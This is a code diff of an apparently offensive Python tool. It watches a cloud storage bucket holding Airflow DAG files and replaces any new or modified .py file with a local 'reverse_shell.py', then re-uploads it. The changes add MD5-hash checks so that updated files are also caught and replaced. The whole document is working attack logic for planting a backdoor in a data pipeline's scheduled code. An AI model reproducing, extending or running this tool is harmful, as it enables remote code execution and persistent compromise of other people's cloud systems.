@@ -20,7 +20,7 @@ bucket = client.get_bucket(bucket_name)
 def list_blobs():
     """List all blobs in the bucket and their metadata."""
     blobs = bucket.list_blobs()
-    return {blob.name: blob.updated for blob in blobs}
+    return {blob.name: (blob.updated, blob.md5_hash) for blob in blobs}
 
 def handle_py_file(py_name, local_backdoor):
     """Handle local folder operations and re-upload the python file."""
@@ -28,7 +28,7 @@ def handle_py_file(py_name, local_backdoor):
     shutil.copyfile(local_backdoor, py_name)
     blob = bucket.blob(py_name)
     blob.upload_from_filename(py_name)
-    print(f"Uploaded new ZIP file: {py_name}")
+    print(f"Uploaded new DAG file: {py_name}")
     os.remove(py_name)
 
 
@@ -38,8 +38,8 @@ def monitor_bucket():
     local_backdoor = './reverse_shell.py'
     last_state = list_blobs()
     print(f"Initial state:")
-    for file_name, updated in last_state.items():
-        print(f"File: {file_name}, Updated: {updated}")
+    for file_name, (updated, md5_hash) in last_state.items():
+        print(f"File: {file_name}, Updated: {updated}, MD5 Hash: {md5_hash}")
 
     while True:
         current_state = list_blobs()
@@ -48,6 +48,11 @@ def monitor_bucket():
         # Check for added or updated files
         for file_name, updated in current_state.items():
             if file_name not in last_state and file_name.endswith('.py'):
+                print(f"New file: {file_name}")
+                modified_files.append(file_name)
+            
+            elif last_state[file_name][1] != current_state[file_name][1] and file_name.endswith('.py'):
+                print(f"Updated file: {file_name}")
                 modified_files.append(file_name)
 
         # Handle added or updated ZIP files
